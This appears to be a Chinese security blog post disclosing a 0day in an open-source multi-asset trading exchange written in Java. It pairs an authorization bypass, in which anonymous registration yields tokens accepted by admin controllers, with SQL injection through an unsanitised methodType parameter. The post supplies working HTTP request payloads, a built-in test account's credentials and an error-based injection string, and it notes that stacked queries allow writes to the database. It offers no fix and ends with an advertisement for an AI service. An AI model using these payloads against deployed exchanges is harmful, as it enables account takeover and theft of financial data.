#  某34国语言综合GP交易所存在前台SQL注入漏洞 (Java)  
原创 XingYue404
                    XingYue404  星悦安全   2026-06-28 10:54  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0 "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
漏洞完全由AI分析，无特殊提示词 Skill，同款见文末.  
  
**34国语言综合股票交易所开源源码 为一套功能完整的综合性在线交易系统，公开资料提及支持加密货币现货/合约/期权、外汇、全球股票、ETF、大宗商品、跟单、C2C、NFT、理财借贷等数十个业务模块，**  
  
**技术栈 : Java Spring Boot 2.7 + Vue3/Vue2 + MySQL + Redis**  
  
****  
**Fofa指纹(后端) : 自己找**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSp9nUwLWmjEFnBBVOZaIMMDRPWvD52wW0Y87j6wWFHySdxLjyasfrbGPbEeCDjsckEDKsuAyvtficBIBVndyRpHvZdRep3WlJRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSr2I2gEs9qa6aRibAnuJYfyfP8LWQfoaYRfvJ8AkCv0oJ5Gw3gGrZ1o5qDhibXXfDknBlwvcbJY8Z3OO3SeOiblNia5KWEcfo1pEWw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSqTBRgXJ1pyVQE2vbtrHBjicYEtJpw5gFbO8jnbgxRYk5BaRGQnz6u450ibZRAwp20YrO2Nc1xhurZGDcZNVWa505XloucZBXMck/640?wx_fmt=png&from=appmsg "")  
## 0x01 前台垂直越权漏洞  
  
**全局过滤器**AuthFilter.doFilter**（**/trad-admin/trading-order-security-common/src/main/java/com/yami/trading/security/common/filter:156-237**）只校验 token 是否有效（**tokenStore.getUserInfoByAccessToken**），解析成功后仅**AuthUserContext.set(userInfoInToken)**即放行，****从不判断 token 的**sysType**（ADMIN / ORDINARY）能否访问当前控制器**  
  
****  
```
if (StrUtil.isNotBlank(accessToken)) {    try {        userInfoInToken = tokenStore.getUserInfoByAccessToken(accessToken, true);        if (userInfoInToken.getSysType().intValue() == SysTypeEnum.ORDINARY.value().intValue()) {            String userId = userInfoInToken.getUserId();            // 缓存优化 TODO            User userEntity = userService.cacheUserBy(userId);            if (userEntity != null) {                userCode = userEntity.getUserCode();            }        }    } catch (Exception e) {        if (e instanceof YamiShopBindException) {            logger.error("---> AuthFilter doFilter 处理 uri:{}, accessToken:{} 报 YamiShopBindException 异常:{}", requestUri, accessToken, e.getMessage());            tokenErr = (YamiShopBindException)e;        } else {            logger.error("---> AuthFilter doFilter 处理 uri:{}, accessToken:{} 报错:", requestUri, accessToken, e);            throw e;        }    }}// 处理黑名单访问，断网逻辑if (checkBlackRequest(req, resp, clientIp, userCode)) {    return;}try {    // 识别时区信息    processTimezone(req);    // 白名单    if (servletPathWhiteUri) {        chain.doFilter(req, resp);        return;    }    //    if (ObjectUtils.isNotEmpty(VERSION_NUMBER)) {        // 验证时间戳签名        if (checkSign(req,response)) {            return;        }    }    // 当前 uri 不用检查是否携带 token，直接执行对应的接口    if (ignoreTokenUri) {        chain.doFilter(req, resp);        return;    }    // 有 token 就用，没 token 也无所谓的 api    if (userInfoInToken != null) {        // 如果有 token，并且解析成功，则走以下处理逻辑        // 已移除IP检查逻辑，不再进行IP地址验证        // if (userInfoInToken.getSysType().intValue() == SysTypeEnum.ADMIN.value().intValue()) {        //     if (!pathMatcher.match("/updateCheckIp", requestUri)) {        //         Object loginIP = RedisUtil.get(RedisKeys.ACCESS_IP + userInfoInToken.getUserId());        //         if (null != loginIP && !IPHelper.equalIpSegment(loginIP.toString(), clientIp)) {        //             logger.error("The Login IP Is Inconsistent With The Operation IP! Login-IP:{} Access-IP:{} Servlet-Path:{}", loginIP, clientIp, servletPath);        //             httpHandler.printServerResponseToWeb("", 1001);        //             return;        //         }        //     }        // }        // 保存上下文        AuthUserContext.set(userInfoInToken);    } elseif (!optionalTokenUri) {        // token 必填的路径        // 如果没有 token，或者 token 解析失败/过期，但是当前请求 uri 又不是一个可选 token 的uri，则报错，提示 token 无效        // 返回前端401                logger.error("---> requestUri:{} 未配置 optional 白名单", requestUri);                httpHandler.printServerResponseToWeb("您的账号已过期或已经在其他地方登录，请重新登录", 403);                return;            }            if (tokenErr != null) {                // 前面解析 token 报错，此处抛出                throw tokenErr;            }            // token 逻辑校验顺利            chain.doFilter(req, resp);
```  
  
  
**授权完全依赖各方法上的**@PreAuthorize**（**@EnableGlobalMethodSecurity**）。经统计**@PreAuthorize**仅出现在 5 个**sys/***控制器（共 21 处）****，其余约 150 个资金类后台控制器****没有任何方法级授权****。**  
  
**SecurityUtils.getSysUser()（SecurityUtils.java:14-31）对 ORDINARY 与 ADMIN token 一视同仁返回非空对象，不区分来源。**  
  
****  
```
public YamiSysUser getSysUser() {    UserInfoInTokenBO userInfoInTokenBO = AuthUserContext.get();    if(userInfoInTokenBO == null){        returnnull;    }    YamiSysUser details = new YamiSysUser();    String userId = userInfoInTokenBO.getUserId();    // 兼容swagger 请求情况    if(StringUtils.isEmpty(userId)){        returnnull;    }    details.setUserId(Long.valueOf(userId));    details.setEnabled(userInfoInTokenBO.getEnabled());    details.setUsername(userInfoInTokenBO.getNickName());    details.setAuthorities(userInfoInTokenBO.getPerms());    details.setShopId(userInfoInTokenBO.getShopId());    return details;}
```  
  
  
**而****token 可经****白名单内的匿名注册接口**/api/registerNoVerifcode**、**/api/user/register**（验证码校验被注释）零成本批量获取.**  
  
**Payload(匿名创建用户获取Token):**  
  
```
POST /api/registerNoVerifcode HTTP/2Host: 127.0.0.1Content-Length: 54Cache-Control: max-age=0Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Sec-Fetch-User: ?1Priority: u=0, iConnection: closeuserName=deep666&password=Passw0rd666&userCode=&type=3
```  
  
  
****  
****  
**如果系统没有 /api/registerNoVerifcode 这个接口，还能通过 /api/user/login 接口登入一些系统内置测试账户来获取到 Token，如下 GET 访问**  
```
/api/user/login?language=en&username=ceshi2&password=123456
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSp60saO4IgXeZsWiclxealyJFib6ia527fHbkDgic9ude38ka0FtGVf2OEKGI9cWDmKE5HNYq3sx3W8ic4Nbo4qTYHTBsqUNCOvMskU/640?wx_fmt=png&from=appmsg "")  
  
**而获取到 Token 之后，我们就直接能操纵后台的一些接口了，权限成功提升不少，很多操作都可以用了，这里不多说.**  
## 0x02 前台SQL注入漏洞  
  
**sink**C2cPaymentMethodMapper.xml:26  
  
**链路**C2cPaymentMethodController.java:96**→**C2cPaymentMethodServiceImpl.java:42-44**→**C2cPaymentMethodMapper.java:12-16  
  
**C2cPaymentMethodMapper.xml**  
  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd"><mapper namespace="com.yami.trading.dao.c2c.C2cPaymentMethodMapper">    <select id="listPage" resultType="com.yami.trading.bean.c2c.dto.C2cPaymentMethodDto">        select        cpm.*,        party.user_id ,        party.user_code ,        party.user_name        from        t_c2c_payment_method cpm        left join tz_user party on cpm.party_id = party.user_id        left join t_c2c_user cu on cu.c2c_user_party_id = party.user_id        where        1 = 1  and cpm.type=#{type}          <if test="loginPartyId!=null and loginPartyId!=''">            and cu.c2c_manager_party_id=#{loginPartyId}        </if>        <if test="userCode!=null and userCode!=''">            AND (party.user_name like CONCAT('%', #{userCode}, '%') or party.user_code like CONCAT('%', #{userCode},            '%'))        </if>        <if test="methodType!=null and methodType!=''">            and cpm.method_type =${methodType}        </if>        <if test="methodName!=null and methodName!=''">            and cpm.method_name like CONCAT('%', #{methodName}, '%')        </if>        order by cpm.create_time desc    </select></mapper>
```  
  
  
c2cpaymentmethodcontroller.java  
  
```
adminC2cPaymentMethodService.listPage(page, "", model.getUserName(), model.getMethodType(), model.getMethodName(),model.getType());
```  
  
  
**C2cPaymentMethodServiceImpl.java**  
  
```
public Page<C2cPaymentMethodDto> listPage(Page page, String loginPartyId, String userCode, String methodType, String methodName,                                          int type) {    return baseMapper.listPage(page,loginPartyId,userCode,methodType,methodName,type);}
```  
  
  
**C2cPaymentMethodMapper.java**  
  
```
Page<C2cPaymentMethodDto> listPage(Page page, @Param("loginPartyId") String loginPartyId,                                   @Param("userCode") String userCode,                                   @Param("methodType") String methodType,                                   @Param("methodName") String methodName,                                   @Param("type")  int type);}
```  
  
  
**由于**methodType**（String，无白名单/数值校验）经**${}**直接拼入 SQL，列**method_type**为整型（无引号数值上下文）。全环境 JDBC URL 含**allowMultiQueries=true**，堆叠写库可行。其余参数用**#{}**（安全）**  
  
**注意这里我们就可以用 0x01 前台垂直越权漏洞可创建的账户来进行授权**  
  
**Payload (获取数据库用户):**  
  
```
POST /api/paymentMethod/list HTTP/2Host: 127.0.0.1Content-Length: 159Cache-Control: max-age=0Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Authorization: 你获取到的前台用户TokenSec-Fetch-User: ?1Priority: u=0, i{  "size": 5,  "current": 1,  "type": 1,  "methodName": "",  "userName": "", "methodType":"1 AND extractvalue(1,concat(0x7e,(SELECT user())))"}
```  
  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSrj08vmb0T6nXFVCvdWzuBRRAtSlPE8V9KJyQ676bCCGY8zV07ahFfxCZTrDuaCsO8SSHrSj6AibrpDwguM8hZ6PFbUmyS3WApo/640?wx_fmt=png&from=appmsg "")  
  
**这里SQL注入有挺多不错的可操作点，就不过多演示了.**  
## 0x03 AI 漏洞挖掘  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**本漏洞完全由星悦AI中转提供的Claude Opus 4.8 挖掘分析.**  
  
****  
https://www.xyusec.com/  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSo3wfCKYWtIr4Sl2Nc4QqSADqsVy1MmiaXRaqteqwhqY3PkYOvNSU8xnaoibv0sgxria1OAVTvnHSetSHxoNbEf6MOsGE70Zia0dj0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
  
新用户还可以添加下方客服进群领5$额度  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSrHb61GkDjDEp6OibS5lMC53agc5ufu86hLoSo9gdyWEPbChjXMYuic8ACpiauMvEmzznJ9erdnVD1xHVHiczkfb1x1fVtcxwib6JTs/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7 "")  
  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
